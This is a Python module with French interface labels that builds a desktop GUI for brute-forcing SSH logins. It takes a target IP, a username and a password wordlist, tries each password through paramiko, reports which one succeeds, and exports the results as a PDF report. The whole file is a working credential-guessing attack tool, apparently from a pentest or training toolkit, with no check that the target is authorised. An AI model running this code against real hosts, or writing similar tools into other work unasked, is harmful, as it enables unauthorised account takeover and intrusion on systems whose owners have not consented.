import customtkinter as ctk
from tkinter import filedialog, scrolledtext
import paramiko
from fpdf import FPDF
import os

def create_bruteforce_frame(app):
    global bruteforce_host_entry, bruteforce_user_entry, bruteforce_pass_entry, bruteforce_result_text

    bruteforce_frame = ctk.CTkFrame(app, width=1720, height=1080, fg_color="#D3D3D3")
    bruteforce_label = ctk.CTkLabel(bruteforce_frame, text="Bruteforce SSH", font=("Helvetica", 20), text_color="black")
    bruteforce_label.pack(pady=20)

    bruteforce_host_label = ctk.CTkLabel(bruteforce_frame, text="Adresse IP :", font=("Helvetica", 14), text_color="black")
    bruteforce_host_label.pack(pady=(20, 5))

    bruteforce_host_entry = ctk.CTkEntry(bruteforce_frame, width=300)
    bruteforce_host_entry.pack(pady=5)

    bruteforce_user_label = ctk.CTkLabel(bruteforce_frame, text="Nom d'utilisateur :", font=("Helvetica", 14), text_color="black")
    bruteforce_user_label.pack(pady=(20, 5))

    bruteforce_user_entry = ctk.CTkEntry(bruteforce_frame, width=300)
    bruteforce_user_entry.pack(pady=5)

    bruteforce_pass_label = ctk.CTkLabel(bruteforce_frame, text="Fichier de mots de passe :", font=("Helvetica", 14), text_color="black")
    bruteforce_pass_label.pack(pady=(20, 5))

    bruteforce_pass_entry = ctk.CTkEntry(bruteforce_frame, width=300)
    bruteforce_pass_entry.pack(pady=5)

    def select_bruteforce_password_file():
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        bruteforce_pass_entry.delete(0, "end")
        bruteforce_pass_entry.insert(0, file_path)

    bruteforce_pass_button = ctk.CTkButton(bruteforce_frame, text="Sélectionner le fichier", command=select_bruteforce_password_file)
    bruteforce_pass_button.pack(pady=(5, 20))

    bruteforce_result_text = scrolledtext.ScrolledText(bruteforce_frame, width=80, height=20, wrap="word")
    bruteforce_result_text.pack(pady=(20, 10))
    bruteforce_result_text.configure(state="disabled")

    bruteforce_button_frame = ctk.CTkFrame(bruteforce_frame, fg_color="#D3D3D3")
    bruteforce_button_frame.pack(pady=10)
    bruteforce_launch_button = ctk.CTkButton(bruteforce_button_frame, text="Lancer", command=lambda: run_bruteforce(bruteforce_host_entry.get(), bruteforce_user_entry.get(), bruteforce_pass_entry.get()))
    bruteforce_launch_button.pack(side="left", padx=(0, 10))
    bruteforce_pdf_button = ctk.CTkButton(bruteforce_button_frame, text="Télécharger en PDF", command=save_bruteforce_as_pdf)
    bruteforce_pdf_button.pack(side="left", padx=(10, 0))

    return bruteforce_frame

def run_bruteforce(host, username, password_file):
    if host and username and password_file:
        if not os.path.isfile(password_file):
            bruteforce_result_text.configure(state="normal")
            bruteforce_result_text.insert("end", f"Le fichier {password_file} est introuvable.\n")
            bruteforce_result_text.configure(state="disabled")
            return

        bruteforce_result_text.configure(state="normal")
        bruteforce_result_text.delete(1.0, "end")
        try:
            with open(password_file, 'r') as file:
                passwords = file.readlines()

            success = False
            attempts = 0
            last_password = ""

            for password in passwords:
                password = password.strip()
                attempts += 1
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, username=username, password=password)
                    bruteforce_result_text.insert("end", f"Succès avec le mot de passe : {password}\n")
                    last_password = password
                    success = True
                    ssh.close()
                    break
                except paramiko.AuthenticationException:
                    bruteforce_result_text.insert("end", f"Échec avec le mot de passe : {password}\n")
                except Exception:
                    continue

                bruteforce_result_text.see("end")
                bruteforce_result_text.update_idletasks()

            if success:
                bruteforce_result_text.insert("end", f"Connexion réussie après {attempts} tentatives avec le mot de passe : {last_password}\n")
            else:
                bruteforce_result_text.insert("end", f"Échec de la connexion après {attempts} tentatives.\n")

        except Exception as e:
            pass
        bruteforce_result_text.configure(state="disabled")

def save_bruteforce_as_pdf(file_path=None):
    if not file_path:
        file_path = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF files", "*.pdf")])
    if file_path:
        pdf = FPDF()
        pdf.add_page()
        pdf.set_auto_page_break(auto=True, margin=15)
        pdf.set_font("Arial", 'B', size=16)
        pdf.cell(0, 10, "Rapport Bruteforce SSH", ln=True, align='C')
        pdf.set_font("Arial", 'BU', size=14)
        pdf.cell(0, 10, "Résultats", ln=True)
        pdf.set_font("Arial", size=12)
        bruteforce_result_text.configure(state="normal")
        lines = bruteforce_result_text.get(1.0, "end").split("\n")
        bruteforce_result_text.configure(state="disabled")
        bruteforce_info = f"Adresse IP : {bruteforce_host_entry.get()}\nNom d'utilisateur : {bruteforce_user_entry.get()}\n\n"
        pdf.multi_cell(0, 10, bruteforce_info)
        for line in lines:
            line_encoded = line.encode('latin-1', 'replace').decode('latin-1')
            pdf.multi_cell(0, 10, line_encoded)
        pdf.output(file_path)
